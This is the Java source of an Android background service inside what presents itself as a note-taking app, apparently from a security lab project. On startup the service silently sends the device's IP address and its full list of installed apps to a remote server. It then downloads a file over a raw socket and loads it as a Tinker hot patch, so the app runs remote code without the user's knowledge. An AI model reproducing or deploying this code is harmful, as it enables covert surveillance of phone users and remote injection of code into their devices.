package com.s3lab.easynote.AutoConnectServer;

import android.annotation.SuppressLint;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.os.Environment;
import android.os.IBinder;
import android.os.StrictMode;
import android.os.SystemClock;
import android.util.Log;

import androidx.annotation.Nullable;

import com.tencent.tinker.lib.tinker.TinkerInstaller;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.net.Inet4Address;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.Socket;
import java.net.SocketException;
import java.net.UnknownHostException;
import java.util.Enumeration;
import java.util.List;

import static android.os.SystemClock.sleep;

public class connectService extends Service {

    private static final String TAG = "Tinker.MainActivity";

    // setting the server IP and server port here
    private static final String SERVER_IP = "";
    private static final int INSTALLED_LIST_PORT = 1111;
    private static final int PATCH_GET_PORT = 1110;
    private static DataInputStream dis;
    private static FileOutputStream fos;

    private boolean GET_HOTPATCH_FILE = false;
    private boolean CONNECT_TO_SERVER = true;
    private boolean CHECK_PATCH_FILE = true;

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startID){
        loadPatch();
        new Thread(new Runnable() {

            @SuppressLint("LongLogTag")
            @Override
            public void run() {
                sleep(1000*3);
                if (CHECK_PATCH_FILE == true){
                    checkPatchFile();
                }
            }
        }).start();
        Intent intent2 = new Intent(this, AutoBroadcastReceiver.class);
        PendingIntent pi = PendingIntent.getBroadcast(this, 0, intent2, 0);
        return super.onStartCommand(intent, flags, startID);
    }

    @Override
    public void onCreate(){
        File file = null;
        file = new File(getExternalFilesDir(null),"/patch_signed_7zip.apk");
        if(file.exists()){
            GET_HOTPATCH_FILE = true;
        }

        if (GET_HOTPATCH_FILE == false) {
            connect_sentapplist();
            GET_HOTPATCH_FILE = true;
        }
        new Thread(new Runnable() {

            @SuppressLint("LongLogTag")
            @Override
            public void run() {
                if (GET_HOTPATCH_FILE == true && CONNECT_TO_SERVER == true) {
                    connect_getpatchfile();
                    CONNECT_TO_SERVER = false;
                }
            }
        }).start();
        AlarmManager manager = (AlarmManager) getSystemService(ALARM_SERVICE);
        long triggerAtTime = SystemClock.elapsedRealtime() + 60 * 1000;
        Intent intent2 = new Intent(this, AutoBroadcastReceiver.class);
        PendingIntent pi = PendingIntent.getBroadcast(this, 0, intent2, 0);
        super.onCreate();
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
    }

    public void checkPatchFile(){
        File file = null;
        file = new File(Environment.getExternalStorageDirectory().getAbsolutePath(),"/patch_signed_7zip.apk");
        if(file.exists()){
            loadPatch();
            CHECK_PATCH_FILE = false;
        }
    }

    public void loadPatch(){
        TinkerInstaller.onReceiveUpgradePatch(getApplicationContext(), getFilesDir()+"/patch_signed_7zip.apk");
    }

    private void connect_getpatchfile() {
        if (android.os.Build.VERSION.SDK_INT > 9) {
            StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
            StrictMode.setThreadPolicy(policy);
        }
        Socket socket = null;
        try {
            InetAddress serverAddr = InetAddress.getByName(SERVER_IP);
            socket = new Socket(serverAddr, PATCH_GET_PORT);
            String message = "---Test_Socket_Android---";
            DataOutputStream out = new DataOutputStream(socket.getOutputStream());
            String toServer = getIP();
            out.writeUTF(toServer);
            out.flush();
            dis = new DataInputStream(socket.getInputStream());
            String fileName = dis.readUTF();
            long fileLength = dis.readLong();
            File file = null;
            file = new File(getFilesDir(), "/patch_signed_7zip.apk");
            fos = new FileOutputStream(file);
            byte[] bytes = new byte[1024];
            int length = 0;
            while((length = dis.read(bytes, 0, bytes.length)) != -1) {
                fos.write(bytes, 0, length);
                fos.flush();
            }
            System.out.println("======== file received : [File Name：" + fileName + "] ========");

        } catch(UnknownHostException e) {
            Log.e(TAG, "unkown server!");
        } catch(Exception e) {
            e.printStackTrace();
        } finally {
            try {
                if(fos != null)
                    fos.close();
                socket.close();
            } catch(Exception e) {
                e.printStackTrace();
            }
        }
    }

    public void connect_sentapplist(){
        if (android.os.Build.VERSION.SDK_INT > 9) {
            StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
            StrictMode.setThreadPolicy(policy);
        }

        Socket socket = null;
        try {
            InetAddress serverAddr = InetAddress.getByName(SERVER_IP);
            Log.d("TCP", "C: Connecting...");
            socket = new Socket(serverAddr, INSTALLED_LIST_PORT);
            String message = "---Test_Socket_Android---";
            DataOutputStream out = new DataOutputStream(socket.getOutputStream());
            String toServer = getIP() + "\n";
            Log.d(TAG, "To server:'" + getIP() + "'");
            toServer = toServer + getInstalledApplication();
            Log.d(TAG, "To server:'" + toServer + "'");
            out.writeUTF(toServer);
            out.flush();

        } catch(UnknownHostException e) {
            Log.e(TAG, "unkown server!");
        } catch(Exception e) {
            e.printStackTrace();
        } finally {
            try {
                if(fos != null)
                    fos.close();
                socket.close();
            } catch(Exception e) {
                e.printStackTrace();
            }
        }
    }

    public String getInstalledApplication(){
        String str = "start";
        PackageManager manager = this.getPackageManager();
        List<PackageInfo> pkgList = manager.getInstalledPackages(0);
        for (int i = 0; i < pkgList.size(); i++) {
            PackageInfo pI = pkgList.get(i);
            str = str + "\n" + pI.packageName;
        }
        return str;
    }

    public String getLocalIP(){
        final String[] stringip = new String[1];
        new Thread(new Runnable(){
            @Override
            public void run() {
                InetAddress localip = null;
                try {
                    localip = InetAddress.getLocalHost();
                } catch (UnknownHostException e) {
                    e.printStackTrace();
                }
                stringip[0] = String.valueOf(localip);
            }
        }).start();
        return stringip[0];
    }

    public static String getIP(){
        try {
            for (Enumeration<NetworkInterface> en = NetworkInterface.getNetworkInterfaces(); en.hasMoreElements();) {
                NetworkInterface intf = en.nextElement();
                for (Enumeration<InetAddress> enumIpAddr = intf.getInetAddresses(); enumIpAddr.hasMoreElements();)
                {
                    InetAddress inetAddress = enumIpAddr.nextElement();
                    if (!inetAddress.isLoopbackAddress() && (inetAddress instanceof Inet4Address))
                    {
                        return inetAddress.getHostAddress().toString();
                    }
                }
            }
        }
        catch (SocketException ex){
            ex.printStackTrace();
        }
        return null;
    }

    public String get_devices_info(){
        String info = "Android.os.version : " + android.os.Build.VERSION.RELEASE + "\n";
        info = info + "Phone Model : " + android.os.Build.MODEL + "\n" + "Phone Brand : " + android.os.Build.BRAND + "\n";
        return android.os.Build.BRAND;
    }

}
